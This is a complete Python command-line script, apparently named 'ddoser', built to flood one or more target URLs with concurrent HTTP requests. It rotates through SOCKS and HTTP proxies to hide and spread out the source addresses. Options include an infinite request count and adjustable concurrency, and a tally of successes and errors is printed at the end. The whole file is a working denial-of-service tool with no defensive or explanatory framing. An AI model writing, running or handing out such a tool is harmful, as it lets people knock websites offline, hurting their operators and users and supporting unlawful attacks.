#!/usr/bin/env python
import asyncio
import sys
from collections import defaultdict
from itertools import cycle
from typing import Iterable, List, Tuple

import aiohttp
import click
import requests as requests
from aiohttp_socks import ProxyConnector

STATS = defaultdict(int)


async def make_request(url: str, proxy: str, verbose: bool, timeout: int):
    timeout = aiohttp.ClientTimeout(total=timeout)
    if verbose:
        print(f'Url: {url} Proxy: {proxy}')
    try:
        if proxy:
            connector = ProxyConnector.from_url(proxy)
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                async with session.get(url) as response:
                    await response.text()
                    print(response.status)
        else:
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(url) as response:
                    await response.text()
                    print(response.status)
    except Exception as error:
        print(f'Url: {url} Proxy: {proxy} Error: {error}', file=sys.stderr)
        STATS[f'{type(error)}'] += 1
    else:
        STATS['success'] += 1


def get_proxy(proxy_iterator: Iterable[str]) -> str:
    try:
        type_, ip, port = next(proxy_iterator)
        return f'{type_}://{ip}:{port}'
    except StopIteration:
        return None


async def ddos(target_url: str, timeout: int, count: int, verbose: bool, proxy_iterator: Iterable[Tuple[str, str, int]]):
    step = 0
    while True:
        if count and step > count:
            break
        step += 1
        proxy = get_proxy(proxy_iterator)
        await make_request(target_url, proxy, verbose, timeout)


async def amain(target_urls: List[str], timeout: int, concurrency: int, count: int, verbose: bool, proxies: List[Tuple[str, str, int]]):
    coroutines = []
    proxy_iterator = cycle(proxies or [])
    for target_url in target_urls:
        for _ in range(concurrency):
            coroutines.append(ddos(target_url, timeout, count, verbose, proxy_iterator))
    await asyncio.gather(*coroutines)


@click.command(help="Run ddoser")
@click.option('--target-url', help='ddos target url')
@click.option('--target-urls-file', help='path to file contains urls to ddos')
@click.option('--proxy-url', help='url to proxy resourse')
@click.option('--proxy-file', help='path to file with proxy list')
@click.option('--concurrency', help='concurrency level', type=int, default=1)
@click.option('--count', help='requests count (0 for infinite)', type=int, default=1)
@click.option('--timeout', help='requests timeout', type=int, default=5)
@click.option('--verbose', help='Show verbose log', is_flag=True, default=False)
def main(
        target_url: str, target_urls_file: str, proxy_url: str, proxy_file: str,
        concurrency: int, count: int, timeout: int, verbose: bool):
    if not target_urls_file and not target_url:
        raise SystemExit('--target-url or --target-urls-file is required')
    proxies = load_proxies(proxy_file, proxy_url)
    target_urls = []
    if target_urls_file:
        with open(target_urls_file) as f:
            target_urls.extend(line.strip() for line in f)
    if target_url:
        target_urls.append(target_url)
    loop = asyncio.get_event_loop()
    loop.run_until_complete(amain(target_urls, timeout, concurrency, count, verbose, proxies))
    for key, value in STATS.items():
        if key != 'success':
            print(f"{key}: {value}")
    print(f'success: {STATS["success"]}')


def load_proxies(proxy_file: str, proxy_url: str) -> List[Tuple[str, str, int]]:
    if proxy_url:
        proxy_data = requests.get(proxy_url).text
    elif proxy_file:
        proxy_data = open(proxy_file).read()
    else:
        proxy_data = None
    if proxy_data:
        proxies = []
        for line in proxy_data.split():
            type_ = line.split('#')[-1]
            ip = line.split(':')[0]
            port = int(line.split(':')[-1].split('#')[0])
            proxies.append((type_, ip, port))
        return proxies
    return None


if __name__ == '__main__':
    main()
